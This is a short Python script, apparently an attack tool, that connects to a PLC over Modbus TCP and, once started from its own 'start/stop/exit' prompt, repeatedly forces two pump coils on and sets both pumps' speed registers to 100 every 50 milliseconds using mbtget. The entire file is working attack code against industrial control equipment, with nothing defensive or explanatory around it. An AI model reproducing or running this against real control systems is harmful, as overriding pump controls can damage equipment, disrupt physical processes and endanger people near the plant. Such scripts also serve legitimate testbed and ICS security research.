import os
import socket
import threading
import time

PLC_HOST = "192.168.2.10"
PLC_PORT = 502

PUMP1_COIL = 0
PUMP2_COIL = 8
PUMP1_HR_SPEED = 10
PUMP2_HR_SPEED = 20

running = False
t = None


def plc_up():
    try:
        s = socket.create_connection((PLC_HOST, PLC_PORT), timeout=3)
        s.close()
        return True
    except OSError:
        return False


def write_coils():
    global running
    while running:
        os.system(f"mbtget -w5 1 -a {PUMP1_COIL} {PLC_HOST} >/dev/null 2>&1")
        os.system(f"mbtget -w5 1 -a {PUMP2_COIL} {PLC_HOST} >/dev/null 2>&1")
        os.system(f"mbtget -w6 100 -a {PUMP1_HR_SPEED} {PLC_HOST} >/dev/null 2>&1")
        os.system(f"mbtget -w6 100 -a {PUMP2_HR_SPEED} {PLC_HOST} >/dev/null 2>&1")
        time.sleep(0.05)


def start():
    global running, t
    if running:
        print("attack already running")
        return
    running = True
    t = threading.Thread(target=write_coils, daemon=True)
    t.start()
    print("attack running")


def stop():
    global running
    if not running:
        print("attack not running")
        return
    running = False
    print("attack stopped")


if __name__ == "__main__":
    if not plc_up():
        print("cannot reach plc")
        raise SystemExit(1)

    while True:
        cmd = input("cmd (start/stop/exit): ").strip().lower()
        if cmd == "start":
            start()
        elif cmd == "stop":
            stop()
        elif cmd == "exit":
            stop()
            break
        else:
            print("unknown")

